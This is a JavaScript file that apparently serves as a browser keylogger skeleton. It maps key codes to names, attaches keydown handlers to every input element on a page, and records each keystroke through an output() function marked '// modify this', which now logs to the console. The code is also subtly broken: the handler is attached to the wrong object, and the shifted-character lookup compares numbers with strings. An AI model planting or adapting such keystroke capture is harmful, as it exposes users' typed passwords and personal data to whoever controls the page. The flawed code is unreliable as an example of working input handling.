var KEYCODES = {
    8: 'BACKSPACE',
    9: 'TAB',
    13: 'ENTER',
    16: 'SHIFT',
    17: 'CTRL',
    18: 'ALT',
    19: 'PAUBRK',
    20: 'CAPSLOCK',
    27: 'ESCAPE',
    32: 'SPACE',
    33: 'PAGEUP',
    34: 'PAGEDOWN',
    35: 'END',
    36: 'HOME',
    37: 'LEFT',
    38: 'UP',
    39: 'RIGHT',
    40: 'DOWN',
    45: 'INS',
    46: 'DELETE',
    48: 'ZERO',
    49: 'ONE',
    50: 'TWO',
    51: 'THREE',
    52: 'FOUR',
    53: 'FIVE',
    54: 'SIX',
    55: 'SEVEN',
    56: 'EIGHT',
    57: 'NINE',
    65: 'A',
    66: 'B',
    67: 'C',
    68: 'D',
    69: 'E',
    70: 'F',
    71: 'G',
    72: 'H',
    73: 'I',
    74: 'J',
    75: 'K',
    76: 'L',
    77: 'M',
    78: 'N',
    79: 'O',
    80: 'P',
    81: 'Q',
    82: 'R',
    83: 'S',
    84: 'T',
    85: 'U',
    86: 'V',
    87: 'W',
    88: 'X',
    89: 'Y',
    90: 'Z',
    91: 'LEFTSUPER',
    92: 'RIGHTSUPER',
    93: 'SELECTKEY',
    96: 'NUMPAD0',
    97: 'NUMPAD1',
    98: 'NUMPAD2',
    99: 'NUMPAD3',
    100: 'NUMPAD4',
    101: 'NUMPAD5',
    102: 'NUMPAD6',
    103: 'NUMPAD7',
    104: 'NUMPAD8',
    105: 'NUMPAD9',
    106: 'MULTIPLY',
    107: 'ADD',
    109: 'SUBTRACT',
    110: 'DECIMALPOINT',
    111: 'DIVIDE',
    112: 'F1',
    113: 'F2',
    114: 'F3',
    115: 'F4',
    116: 'F5',
    117: 'F6',
    118: 'F7',
    119: 'F8',
    120: 'F9',
    121: 'F10',
    122: 'F11',
    123: 'F12',
    144: 'NUMLOCK',
    145: 'SCROLLLOCK',
    186: 'SEMICOLON',
    187: 'EQUALSIGN',
    188: 'COMMA',
    189: 'DASH',
    190: 'PERIOD',
    191: 'FORWARDSLASH',
    192: 'GRAVEACCENT',
    219: 'OPENBRACKET',
    220: 'BACKSLASH',
    221: 'CLOSEBRAKET',
    222: 'SINGLEQUOTE'
};

var list = document.getElementsByTagName("input");

for (var i = 0; i < list.length; i++) {
    list[i].onfocus = listen(this);
}

function listen(element) {
    var capslocked = false;
    var shifted = false;
    element.onkeydown = function (e) {
        var keycode = (e.keyCode ? e.keyCode : e.which);

        if (keycode == 20) {
            capslocked = true;
        }

        if (keycode == 16) {
            shifted = true;
        }

        if (capslocked == true && shifted == true) {
            output(findKeyFromCode(keycode).toLowerCase());
        } else if (capslocked == true) {
            output(findKeyFromCode(keycode));
        } else if (shifted == true) {

            var s = getShiftedChar(keycode);

            if (s == null || s == undefined) {
                output(findKeyFromCode(keycode));
            } else {
                output(s);
            }
        } else {
            output(findKeyFromCode(keycode).toLowerCase());
        }


        element.onkeyup = function (e) {
            var keycode = (e.keyCode ? e.keyCode : e.which);
            if (keycode == 20) {
                capslocked = false;
            }
            if (keycode == 16) {
                shifted = false;
            }
        };
    }
}

function findKeyFromCode(c) {
    return KEYCODES[c];
}

function output(text) {
    console.log(text);
} // modify this

function getShiftedChar(keycode) {
    if (keycode == KEYCODES[48]) {
        return ')';
    }

    if (keycode == KEYCODES[49]) {
        return '!';
    }

    if (keycode == KEYCODES[50]) {
        return '@';
    }

    if (keycode == KEYCODES[51]) {
        return '#';
    }

    if (keycode == KEYCODES[52]) {
        return '$';
    }

    if (keycode == KEYCODES[53]) {
        return '%';
    }

    if (keycode == KEYCODES[54]) {
        return '^';
    }

    if (keycode == KEYCODES[55]) {
        return '&';
    }

    if (keycode == KEYCODES[56]) {
        return '*';
    }

    if (keycode == KEYCODES[57]) {
        return '(';
    }

    if (keycode == KEYCODES[188]) {
        return '<';
    }

    if (keycode == KEYCODES[190]) {
        return '>';
    }

    if (keycode == KEYCODES[186]) {
        return ':';
    }

    if (keycode == KEYCODES[222]) {
        return '"';
    }

    if (keycode == KEYCODES[220]) {
        return '|';
    }

    if (keycode == KEYCODES[191]) {
        return '?';
    }

    if (keycode == KEYCODES[219]) {
        return '{';
    }

    if (keycode == KEYCODES[221]) {
        return '}';
    }

    if (keycode == KEYCODES[189]) {
        return '_';
    }

    if (keycode == KEYCODES[187]) {
        return '+';
    }
}
